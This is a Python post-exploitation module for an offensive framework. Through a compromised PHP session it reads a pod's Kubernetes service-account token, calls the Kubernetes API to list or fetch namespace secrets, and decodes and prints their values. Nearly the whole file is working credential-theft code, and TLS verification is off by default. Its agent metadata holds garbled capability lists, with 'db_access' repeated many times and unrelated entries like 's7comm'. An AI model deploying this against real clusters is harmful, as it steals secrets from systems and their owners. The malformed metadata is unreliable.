#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *


class Module(Post):
    __info__ = {
        "name": "Kubernetes ServiceAccount Secret Reader",
        "description": (
            "Reads a pod service-account token from a PHP session and uses it to query the "
            "Kubernetes API for secrets in a namespace."
        ),
        "author": "KittySploit Team",
        "platform": Platform.UNIX,
        "session_type": SessionType.PHP,
        "arch": Arch.PHP,
        "tags": ["kubernetes", "k8s", "serviceaccount", "secrets", "rbac", "cloud"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    api_server = OptString("", "Kubernetes API URL; empty uses KUBERNETES_SERVICE_HOST/PORT", False)
    namespace = OptString("", "Namespace; empty reads serviceaccount namespace file or defaults to default", False)
    secret_name = OptString("", "Specific secret name to fetch; empty lists namespace secrets", False)
    token_path = OptString("/run/secrets/kubernetes.io/serviceaccount/token", "ServiceAccount token path", False)
    namespace_path = OptString("/run/secrets/kubernetes.io/serviceaccount/namespace", "ServiceAccount namespace path", False)
    decode_values = OptBool(True, "Base64-decode secret data values in module output", False)
    verify_tls = OptBool(False, "Verify Kubernetes API TLS certificate", False, advanced=True)
    max_output = OptInteger(20000, "Maximum output characters to print", False, advanced=True)

    @staticmethod
    def _escape_php(value: str) -> str:
        return (value or "").replace("\\", "\\\\").replace("'", "\\'")

    def _php(self) -> str:
        api = self._escape_php(str(self.api_server or "").strip())
        ns = self._escape_php(str(self.namespace or "").strip())
        name = self._escape_php(str(self.secret_name or "").strip())
        token_path = self._escape_php(str(self.token_path or ""))
        namespace_path = self._escape_php(str(self.namespace_path or ""))
        verify = "true" if bool(self.verify_tls) else "false"

        return f"""
$token_path = '{token_path}';
$namespace_path = '{namespace_path}';
$api = '{api}';
$namespace = '{ns}';
$secret = '{name}';
if (!file_exists($token_path)) {{
    echo json_encode(array('error' => 'token_not_found', 'path' => $token_path));
    return;
}}
$token = trim(file_get_contents($token_path));
if ($namespace === '') {{
    $namespace = file_exists($namespace_path) ? trim(file_get_contents($namespace_path)) : 'default';
}}
if ($api === '') {{
    $host = getenv('KUBERNETES_SERVICE_HOST');
    $port = getenv('KUBERNETES_SERVICE_PORT') ?: '443';
    if (!$host) {{
        echo json_encode(array('error' => 'api_server_not_set'));
        return;
    }}
    $api = 'https://' . $host . ':' . $port;
}}
$path = '/api/v1/namespaces/' . rawurlencode($namespace) . '/secrets';
if ($secret !== '') {{
    $path .= '/' . rawurlencode($secret);
}}
$ctx = stream_context_create(array(
    'http' => array(
        'method' => 'GET',
        'header' => "Authorization: Bearer " . $token . "\\r\\nAccept: application/json\\r\\n",
        'ignore_errors' => true,
        'timeout' => 15
    ),
    'ssl' => array(
        'verify_peer' => {verify},
        'verify_peer_name' => {verify}
    )
));
$response = @file_get_contents($api . $path, false, $ctx);
$status = isset($http_response_header[0]) ? $http_response_header[0] : '';
echo json_encode(array('api' => $api, 'namespace' => $namespace, 'secret' => $secret, 'status' => $status, 'response' => $response));
"""

    @staticmethod
    def _decode_secret_values(obj):
        import base64

        def decode_map(data):
            out = {}
            for key, value in (data or {}).items():
                try:
                    out[key] = base64.b64decode(value).decode("utf-8", errors="replace")
                except Exception:
                    out[key] = value
            return out

        if isinstance(obj, dict) and obj.get("kind") == "Secret":
            obj = dict(obj)
            obj["decoded_data"] = decode_map(obj.get("data") or {})
            return obj
        if isinstance(obj, dict) and isinstance(obj.get("items"), list):
            obj = dict(obj)
            items = []
            for item in obj.get("items") or []:
                items.append(Module._decode_secret_values(item))
            obj["items"] = items
        return obj

    def run(self):
        raw = self.cmd_execute(self._php())
        if not raw:
            print_error("No response from PHP session")
            return False
        try:
            envelope = json.loads(raw)
        except Exception:
            print_warning("Could not parse response envelope as JSON")
            print_info(raw[: int(self.max_output or 20000)])
            return False

        status = envelope.get("status") or ""
        body = envelope.get("response") or ""
        print_info(f"API: {envelope.get('api')} namespace={envelope.get('namespace')} status={status}")
        if not body:
            print_warning("Kubernetes API returned an empty body")
            return False
        try:
            parsed = json.loads(body)
            if self.decode_values:
                parsed = self._decode_secret_values(parsed)
            rendered = json.dumps(parsed, indent=2, sort_keys=True)
        except Exception:
            rendered = body
        limit = int(self.max_output or 20000)
        print_info(rendered[:limit])
        if len(rendered) > limit:
            print_warning(f"Output truncated to {limit} characters")
        return status.startswith("HTTP/") and " 200 " in f" {status} "
